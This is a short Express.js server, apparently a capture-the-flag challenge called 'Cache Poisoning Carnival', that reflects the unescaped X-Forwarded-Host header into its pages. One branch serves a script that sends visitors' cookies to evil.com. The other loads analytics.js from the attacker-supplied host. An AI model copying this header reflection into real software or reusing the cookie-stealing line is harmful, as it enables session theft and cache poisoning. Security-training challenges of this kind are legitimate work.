const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

const PORT = process.env.PORT || 3000;
const FLAG = process.env.FLAG || 'CGS{test-flag}';

app.use(cookieParser());

app.get('/', (req, res) => {
  const host = req.headers['x-forwarded-host'] || req.headers.host || 'localhost';

  if (/<[^>]*script[^>]*>|"/.test(host)) {
    res.send(`<!DOCTYPE html>
<html>
<head><title>Cache Poisoning Carnival</title></head>
<body>
<h1>Welcome</h1>
<p>Host: ${host}</p>
<script>
  document.write('<img src="http://evil.com/steal?cookie=' + document.cookie + '" />');
  document.write('<p>Flag: ${FLAG}</p>');
</script>
</body>
</html>`);
  } else {
    res.send(`<!DOCTYPE html>
<html>
<head><title>Cache Poisoning Carnival</title></head>
<body>
<h1>Welcome</h1>
<p>Serving from: ${host}</p>
<script src="http://${host}/analytics.js"></script>
</body>
</html>`);
  }
});

app.listen(PORT, () => console.log(`cache-poisoning-carnival running on port ${PORT}`));
